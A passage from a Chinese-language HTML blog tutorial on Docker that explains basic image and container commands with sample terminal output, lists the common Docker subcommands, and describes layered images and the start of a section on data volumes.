OS,返个新建过程是分钟级别的。而docker由于直接利用宿主机的操作系统,则省略了返个过程,因此新建一个docker容器只需要几秒钟。</p><h1 id="docker命令"><a href="#docker命令" class="headerlink" title="docker命令"></a>docker命令</h1><h2 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h2><h3 id="docker-images"><a href="#docker-images" class="headerlink" title="docker images"></a>docker images</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 列出本地主机上的镜像</span><br><span class="line">[root@d3f4u1t ~]# docker images</span><br><span class="line">REPOSITORY    TAG      IMAGE ID       CREATED       SIZE</span><br><span class="line">hello-world  latest  bf756fb1ae65   4 months ago   23.3kB</span><br><span class="line"></span><br><span class="line"># 解释</span><br><span class="line">REPOSITORY 镜像的仓库源</span><br><span class="line">TAG 镜像的标签</span><br><span class="line">IMAGE ID 镜像的ID</span><br><span class="line">CREATED 镜像创建时间</span><br><span class="line">SIZE 镜像大小</span><br><span class="line"></span><br><span class="line"># 同一个仓库源可以有多个 TAG，代表这个仓库源的不同版本，我们使用REPOSITORY：TAG 定义不同</span><br><span class="line">的镜像，如果你不定义镜像的标签版本，docker将默认使用 lastest 镜像！</span><br><span class="line"></span><br><span class="line"># 可选项</span><br><span class="line">-a： 列出本地所有镜像</span><br><span class="line">-q： 只显示镜像id</span><br><span class="line">--digests： 显示镜像的摘要信息</span><br></pre></td></tr></table></figure></div><h3 id="docker-search"><a href="#docker-search" class="headerlink" title="docker search"></a>docker search</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 搜索镜像</span><br><span class="line">[root@d3f4u1t ~]# docker search mysql</span><br><span class="line">NAME DESCRIPTION STARS</span><br><span class="line">OFFICIAL</span><br><span class="line">mysql MySQL is a widely used, open-source relation… 9484</span><br><span class="line">[OK]</span><br><span class="line"></span><br><span class="line"># docker search 某个镜像的名称 对应DockerHub仓库中的镜像</span><br><span class="line"></span><br><span class="line"># 可选项</span><br><span class="line">--filter=stars=50 ： 列出收藏数不小于指定值的镜像。</span><br></pre></td></tr></table></figure></div><h3 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 下载镜像</span><br><span class="line">[root@d3f4u1t ~]# docker pull mysql</span><br><span class="line">Using default tag: latest # 不写tag，默认是latest最新版本</span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">54fec2fa59d0: Already exists # 分层下载</span><br><span class="line">bcc6c6145912: Already exists</span><br><span class="line">951c3d959c9d: Already exists</span><br><span class="line">05de4d0e206e: Already exists</span><br><span class="line">319f0394ef42: Already exists</span><br><span class="line">d9185034607b: Already exists</span><br><span class="line">013a9c64dadc: Already exists</span><br><span class="line">42f3f7d10903: Pull complete</span><br><span class="line">c4a3851d9207: Pull complete</span><br><span class="line">Digest:</span><br><span class="line">sha256:61a2a33f4b8b4bc93b7b6b9e65e64044aaec594809f818aeffbff69a893d1944 #</span><br><span class="line">签名</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br><span class="line">docker.io/library/mysql:latest # 真实位置</span><br><span class="line"># 指定版本下载</span><br><span class="line">[root@d3f4u1t ~]# docker pull mysql:5.7</span><br><span class="line">....</span><br></pre></td></tr></table></figure></div><h3 id="docker-rmi"><a href="#docker-rmi" class="headerlink" title="docker rmi"></a>docker rmi</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 删除镜像</span><br><span class="line">docker rmi -f 镜像id # 删除单个</span><br><span class="line">docker rmi -f 镜像名:tag 镜像名:tag # 删除多个</span><br><span class="line">docker rmi -f $(docker images -qa) # 删除全部</span><br></pre></td></tr></table></figure></div><h2 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h2><p>有镜像才能创建容器，这里使用 centos 的镜像来测试，就是虚拟一个 centos </p><h3 id="新建容器并启动"><a href="#新建容器并启动" class="headerlink" title="新建容器并启动"></a><strong>新建容器并启动</strong></h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 命令</span><br><span class="line">docker run [OPTIONS] IMAGE [COMMAND][ARG...]</span><br><span class="line"></span><br><span class="line"># 常用参数说明</span><br><span class="line">--name=&quot;Name&quot; # 给容器指定一个名字</span><br><span class="line">-d # 后台方式运行容器，并返回容器的id！</span><br><span class="line">-i # 以交互模式运行容器，通过和 -t 一起使用</span><br><span class="line">-t # 给容器重新分配一个终端，通常和 -i 一起使用</span><br><span class="line">-P # 随机端口映射（大写）</span><br><span class="line">-p # 指定端口映射（小结），一般可以有四种写法</span><br><span class="line">ip:hostPort:containerPort</span><br><span class="line">ip::containerPort</span><br><span class="line">hostPort:containerPort (常用)</span><br><span class="line">containerPort</span><br><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">[root@d3f4u1t ~]# docker images</span><br><span class="line">REPOSITORY  TAG      IMAGE ID      CREATED       SIZE</span><br><span class="line">centos     latest  470671670cac  3 months ago    237MB</span><br><span class="line"></span><br><span class="line"># 使用centos进行用交互模式启动容器，在容器内执行/bin/bash命令！</span><br><span class="line">[root@d3f4u1t ~]# docker run -it centos /bin/bash</span><br><span class="line">[root@dc8f24dd06d0 /]# ls # 注意地址，已经切换到容器内部了！</span><br><span class="line">bin etc lib lost+found mnt proc run srv tmp var</span><br><span class="line">dev home lib64 media opt root sbin sys usr</span><br></pre></td></tr></table></figure></div><h3 id="列出所有运行的容器"><a href="#列出所有运行的容器" class="headerlink" title="列出所有运行的容器"></a>列出所有运行的容器</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 命令</span><br><span class="line">docker ps [OPTIONS]</span><br><span class="line"></span><br><span class="line"># 常用参数说明</span><br><span class="line">-a # 列出当前所有正在运行的容器 + 历史运行过的容器</span><br><span class="line">-l # 显示最近创建的容器</span><br><span class="line">-n=? # 显示最近n个创建的容器</span><br><span class="line">-q # 静默模式，只显示容器编号。</span><br></pre></td></tr></table></figure></div><h3 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit # 容器停止退出</span><br><span class="line">ctrl+P+Q # 容器不停止退出</span><br></pre></td></tr></table></figure></div><h3 id="启动时停止容器"><a href="#启动时停止容器" class="headerlink" title="启动时停止容器"></a>启动时停止容器</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start (容器id or 容器名) # 启动容器</span><br><span class="line">docker restart (容器id or 容器名) # 重启容器</span><br><span class="line">docker stop (容器id or 容器名) # 停止容器</span><br><span class="line">docker kill (容器id or 容器名) # 强制停止容器</span><br></pre></td></tr></table></figure></div><h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rm 容器id # 删除指定容器</span><br><span class="line">docker rm -f $(docker ps -a -q) # 删除所有容器</span><br><span class="line">docker ps -a -q|xargs docker rm # 删除所有容器</span><br></pre></td></tr></table></figure></div><h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><h3 id="后台启动容器"><a href="#后台启动容器" class="headerlink" title="后台启动容器"></a>后台启动容器</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 命令</span><br><span class="line">docker run -d 容器名</span><br><span class="line"></span><br><span class="line"># 例子</span><br><span class="line">docker run -d centos # 启动centos，使用后台方式启动</span><br><span class="line"></span><br><span class="line"># 问题： 使用docker ps 查看，发现容器已经退出了！</span><br><span class="line"># 解释：Docker容器后台运行，就必须有一个前台进程，容器运行的命令如果不是那些一直挂起的命</span><br><span class="line">令，就会自动退出。</span><br><span class="line"># 比如，你运行了nginx服务，但是docker前台没有运行应用，这种情况下，容器启动后，会立即自</span><br><span class="line">杀，因为他觉得没有程序了，所以最好的情况是，将你的应用使用前台进程的方式运行启动。</span><br></pre></td></tr></table></figure></div><h3 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 命令</span><br><span class="line">docker logs -f -t --tail 容器id</span><br><span class="line"># eg:</span><br><span class="line">[root@d3f4u1t ~]# docker run -d centos /bin/sh -c &quot;while true;do echo kuangshen;sleep 1;done&quot;</span><br><span class="line"></span><br><span class="line">[root@d3f4u1t ~]# docker ps</span><br><span class="line">CONTAINER ID IMAGE</span><br><span class="line">c8530dbbe3b4 centos</span><br><span class="line"></span><br><span class="line"># -t 显示时间戳</span><br><span class="line"># -f 打印最新的日志</span><br><span class="line"># --tail 数字 显示多少条！</span><br><span class="line"></span><br><span class="line">[root@d3f4u1t ~]# docker logs -tf --tail 10 c8530dbbe3b4</span><br><span class="line">2020-05-11T08:46:40.656901941Z kuangshen</span><br><span class="line">2020-05-11T08:46:41.658765018Z kuangshen</span><br><span class="line">2020-05-11T08:46:42.661015375Z kuangshen</span><br><span class="line">2020-05-11T08:46:43.662865628Z kuangshen</span><br><span class="line">2020-05-11T08:46:44.664571547Z kuangshen</span><br><span class="line">2020-05-11T08:46:45.666718583Z kuangshen</span><br><span class="line">2020-05-11T08:46:46.668556725Z kuangshen</span><br><span class="line">2020-05-11T08:46:47.670424699Z kuangshen</span><br><span class="line">2020-05-11T08:46:48.672324512Z kuangshen</span><br><span class="line">2020-05-11T08:46:49.674092766Z kuangshen</span><br></pre></td></tr></table></figure></div><h3 id="查看容器中运行的进程信息，支持ps命令参数。"><a href="#查看容器中运行的进程信息，支持ps命令参数。" class="headerlink" title="查看容器中运行的进程信息，支持ps命令参数。"></a>查看容器中运行的进程信息，支持ps命令参数。</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 命令</span><br><span class="line">docker top 容器id</span><br><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">[root@d ~]# docker top c8530dbbe3b4</span><br><span class="line">UID    PID   PPID   C   STIME   TTY   TIME        CMD</span><br><span class="line">root  27437  27421  0   16:43    ?   00:00:00   /bin/sh -c ....</span><br></pre></td></tr></table></figure></div><h3 id="查看容器镜像的元数据"><a href="#查看容器镜像的元数据" class="headerlink" title="查看容器镜像的元数据"></a>查看容器镜像的元数据</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># 命令</span><br><span class="line">docker inspect 容器id</span><br><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">[root@d3f4u1t ~]# docker inspect c8530dbbe3b4</span><br><span class="line">[</span><br><span class="line">&#123;</span><br><span class="line"># 完整的id，这里上面的容器id，就是截取的这个id前几位</span><br><span class="line">&quot;Id&quot;:</span><br><span class="line">&quot;c8530dbbe3b44a0c873f2566442df6543ed653c1319753e34b400efa05f77cf8&quot;,</span><br><span class="line">&quot;Created&quot;: &quot;2020-05-11T08:43:45.096892382Z&quot;,</span><br><span class="line">&quot;Path&quot;: &quot;/bin/sh&quot;,</span><br><span class="line">&quot;Args&quot;: [</span><br><span class="line">&quot;-c&quot;,</span><br><span class="line">&quot;while true;do echo kuangshen;sleep 1;done&quot;</span><br><span class="line">],</span><br><span class="line"># 状态</span><br><span class="line">&quot;State&quot;: &#123;</span><br><span class="line">&quot;Status&quot;: &quot;running&quot;,</span><br><span class="line">&quot;Running&quot;: true,</span><br><span class="line">&quot;Paused&quot;: false,</span><br><span class="line">&quot;Restarting&quot;: false,</span><br><span class="line">&quot;OOMKilled&quot;: false,</span><br><span class="line">&quot;Dead&quot;: false,</span><br><span class="line">&quot;Pid&quot;: 27437,</span><br><span class="line">&quot;ExitCode&quot;: 0,</span><br><span class="line">&quot;Error&quot;: &quot;&quot;,</span><br><span class="line">&quot;StartedAt&quot;: &quot;2020-05-11T08:43:45.324474622Z&quot;,</span><br><span class="line">&quot;FinishedAt&quot;: &quot;0001-01-01T00:00:00Z&quot;</span><br><span class="line">&#125;,</span><br><span class="line">// ...........</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div><h3 id="进入正在运行的容器"><a href="#进入正在运行的容器" class="headerlink" title="进入正在运行的容器"></a>进入正在运行的容器</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># 命令1</span><br><span class="line">docker exec -it 容器id bashShell</span><br><span class="line"></span><br><span class="line"># 测试1</span><br><span class="line">[root@d3f4u1t ~]# docker ps</span><br><span class="line">CONTAINER ID IMAGE COMMAND CREATED</span><br><span class="line">STATUS PORTS NAMES</span><br><span class="line">c8530dbbe3b4 centos &quot;/bin/sh -c &#x27;while t…&quot; 12 minutes</span><br><span class="line">ago Up 12 minutes happy_chaum</span><br><span class="line">[root@d3f4u1t ~]# docker exec -it c8530dbbe3b4 /bin/bash</span><br><span class="line">[root@c8530dbbe3b4 /]# ps -ef</span><br><span class="line">UID PID PPID C STIME TTY TIME CMD</span><br><span class="line">root 1 0 0 08:43 ? 00:00:00 /bin/sh -c while true;do</span><br><span class="line">echo kuangshen;sleep</span><br><span class="line">root 751 0 0 08:56 pts/0 00:00:00 /bin/bash</span><br><span class="line">root 769 1 0 08:56 ? 00:00:00 /usr/bin/coreutils --</span><br><span class="line">coreutils-prog-shebang=s</span><br><span class="line">root 770 751 0 08:56 pts/0 00:00:00 ps -ef</span><br><span class="line"></span><br><span class="line"># 命令2</span><br><span class="line">docker attach 容器id</span><br><span class="line"></span><br><span class="line"># 测试2</span><br><span class="line">[root@d3f4u1t ~]# docker exec -it c8530dbbe3b4 /bin/bash</span><br><span class="line">[root@c8530dbbe3b4 /]# ps -ef</span><br><span class="line">UID PID PPID C STIME TTY TIME CMD</span><br><span class="line">root 1 0 0 08:43 ? 00:00:00 /bin/sh -c while true;do</span><br><span class="line">echo kuangshen;sleep</span><br><span class="line">root 856 0 0 08:57 pts/0 00:00:00 /bin/bash</span><br><span class="line">root 874 1 0 08:57 ? 00:00:00 /usr/bin/coreutils --</span><br><span class="line">coreutils-prog-shebang=s</span><br><span class="line">root 875 856 0 08:57 pts/0 00:00:00 ps -ef</span><br><span class="line"></span><br><span class="line"># 区别</span><br><span class="line"># exec 是在容器中打开新的终端，并且可以启动新的进程</span><br><span class="line"># attach 直接进入容器启动命令的终端，不会启动新的进程</span><br></pre></td></tr></table></figure></div><h3 id="从容器中拷贝内容到主机上"><a href="#从容器中拷贝内容到主机上" class="headerlink" title="从容器中拷贝内容到主机上"></a>从容器中拷贝内容到主机上</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 命令</span><br><span class="line">docker cp 容器id:容器内路径 目的主机路径</span><br><span class="line"></span><br><span class="line"># 测试</span><br><span class="line"># 容器内执行，创建一个文件测试</span><br><span class="line">[root@c8530dbbe3b4 /]# cd /home</span><br><span class="line">[root@c8530dbbe3b4 home]# touch f1</span><br><span class="line">[root@c8530dbbe3b4 home]# ls</span><br><span class="line">f1</span><br><span class="line">[root@c8530dbbe3b4 home]# exit</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line"># linux复制查看，是否复制成功</span><br><span class="line">[root@d3f4u1t ~]# docker cp c8530dbbe3b4:/home/f1 /home</span><br><span class="line">[root@d3f4u1t ~]# cd /home</span><br><span class="line">[root@d3f4u1t home]# ls</span><br><span class="line">f1</span><br></pre></td></tr></table></figure></div><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20221228211456019.png" alt="image-20221228211456019"></p><p>常用命令：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">attach: Attach to a running container # 当前 shell 下attach 连接指定运行镜像</span><br><span class="line"></span><br><span class="line">build: Build an image from a Dockerfile # 通过 Dockerfile 定制镜像</span><br><span class="line"></span><br><span class="line">commit: Create a new image from a container changes # 提交当前容器为新的镜像</span><br><span class="line"></span><br><span class="line">cp: Copy files/folders from the containers filesystem to the host path</span><br><span class="line">#从容器中拷贝指定文件或者目录到宿主机中</span><br><span class="line"></span><br><span class="line">create: Create a new container # 创建一个新的容器，同run，但不启动容器</span><br><span class="line"></span><br><span class="line">diff: Inspect changes on a container&#x27;s filesystem # 查看 docker 容器变化</span><br><span class="line"></span><br><span class="line">events: Get real time events from the server # 从 docker 服务获取容器实时事件</span><br><span class="line"></span><br><span class="line">exec: Run a command in an existing container # 在已存在的容器上运行命令</span><br><span class="line"></span><br><span class="line">export: Stream the contents of a container as a tar archive # 导出容器的内容流作为一个 tar 归档文件[对应 import ]</span><br><span class="line"></span><br><span class="line">history: Show the history of an image # 展示一个镜像形成历史</span><br><span class="line"></span><br><span class="line">images: List images # 列出系统当前镜像</span><br><span class="line"></span><br><span class="line">import: Create a new filesystem image from the contents of a tarball # 从tar包中的内容创建一个新的文件系统映像[对应export]</span><br><span class="line"></span><br><span class="line">info: Display system-wide information # 显示系统相关信息</span><br><span class="line"></span><br><span class="line">inspect: Return low-level information on a container # 查看容器详细信息</span><br><span class="line"></span><br><span class="line">kill: Kill a running container # kill 指定 docker 容器</span><br><span class="line"></span><br><span class="line">load: Load an image from a tar archive # 从一个 tar 包中加载一个镜像[对应 save]</span><br><span class="line"></span><br><span class="line">login: Register or Login to the docker registry server # 注册或者登陆一个docker 源服务器</span><br><span class="line"></span><br><span class="line">logout: Log out from a Docker registry server # 从当前 Dockerregistry 退出</span><br><span class="line"></span><br><span class="line">logs: Fetch the logs of a container # 输出当前容器日志信息</span><br><span class="line"></span><br><span class="line">port: Lookup the public-facing port which is NAT-ed to PRIVATE_PORT #查看映射端口对应的容器内部源端口</span><br><span class="line"></span><br><span class="line">pause: Pause all processes within a container # 暂停容器</span><br><span class="line"></span><br><span class="line">ps: List containers # 列出容器列表</span><br><span class="line"></span><br><span class="line">pull: Pull an image or a repository from the docker registry server #从docker镜像源服务器拉取指定镜像或者库镜像</span><br><span class="line"></span><br><span class="line">push: Push an image or a repository to the docker registry server #推送指定镜像或者库镜像至docker源服务器</span><br><span class="line"></span><br><span class="line">restart: Restart a running container # 重启运行的容器</span><br><span class="line"></span><br><span class="line">rm: Remove one or more containers # 移除一个或者多个容器</span><br><span class="line"></span><br><span class="line">rmi: Remove one or more images # 移除一个或多个镜像[无容器使用该镜像才可删除，否则需删除相关容器才可继续或 -f 强制删除]</span><br><span class="line"></span><br><span class="line">run: Run a command in a new container # 创建一个新的容器并运行一个命令</span><br><span class="line"></span><br><span class="line">save: Save an image to a tar archive # 保存一个镜像为一个tar 包[对应 load]</span><br><span class="line"></span><br><span class="line">search: Search for an image on the Docker Hub # 在 docker hub 中搜索镜像</span><br><span class="line"></span><br><span class="line">start: Start a stopped containers # 启动容器</span><br><span class="line"></span><br><span class="line">stop: Stop a running containers # 停止容器</span><br><span class="line"></span><br><span class="line">tag: Tag an image into a repository # 给源中镜像打标签</span><br><span class="line"></span><br><span class="line">top: Lookup the running processes of a container # 查看容器中运行的进程信息</span><br><span class="line"></span><br><span class="line">unpause: Unpause a paused container # 取消暂停容器</span><br><span class="line"></span><br><span class="line">version: Show the docker version information # 查看 docker 版本号</span><br><span class="line"></span><br><span class="line">wait: Block until a container stops, then print its exit code # 截取容器停止时的退出状态值</span><br></pre></td></tr></table></figure></div><h1 id="docker镜像详解"><a href="#docker镜像详解" class="headerlink" title="docker镜像详解"></a>docker镜像详解</h1><h2 id="何为镜像"><a href="#何为镜像" class="headerlink" title="何为镜像"></a>何为镜像</h2><p>镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p><h2 id="加载原理"><a href="#加载原理" class="headerlink" title="加载原理"></a>加载原理</h2><p>docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。</p><p>bootfs(boot fifile system)主要包含bootloader和kernel, bootloader主要是引导加载kernel, Linux刚启动时会加载bootfs文件系统，在Docker镜像的最底层是bootfs。这一层与我们典型的Linux&#x2F;Unix系统是一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由bootfs转交给内核，此时系统也会卸载bootfs。</p><p>rootfs (root fifile system) ，在bootfs之上。包含的就是典型 Linux 系统中的 &#x2F;dev, &#x2F;proc, &#x2F;bin, &#x2F;etc 等标准目录和文件。rootfs就是各种不同的操作系统发行版，比如Ubuntu，Centos等等。</p><h2 id="分层结构"><a href="#分层结构" class="headerlink" title="分层结构"></a>分层结构</h2><p>docker镜像采用分层结构，最大的好处莫过于资源共享。比如有多个镜像都从相同的Base镜像构建而来，那么宿主机只需在磁盘上保留一份base镜像，同时内存中也只需要加载一份base镜像，这样就可以为所有的容器服务了，而且镜像的每一层都可以被共享。</p><p>理解：</p><p>所有的 Docker 镜像都起始于一个基础镜像层，当进行修改或增加新的内容时，就会在当前镜像层之上，创建新的镜像层。</p><p>举一个简单的例子，假如基于 Ubuntu Linux 16.04 创建一个新的镜像，这就是新镜像的第一层；如果在该镜像中添加 Python包，就会在基础镜像层之上创建第二个镜像层；如果继续添加一个安全补丁，就会创建第三个镜像层。</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20221230225349259.png" alt="image-20221230225349259"></p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>Docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部</p><p>这一层就是我们通常说的容器层，容器之下的都叫镜像层</p><h1 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h1><h2 id="何为容器数据卷"><a href="#何为容器数据卷" class="headerlink" title="何为容器数据卷"></a>何为容器数据卷</h2><p>卷就是目录或者文件，存在一个或者多个容器中，由docker挂载到容器，但不属于联合文件系统，因此能够绕过 Union File System ， 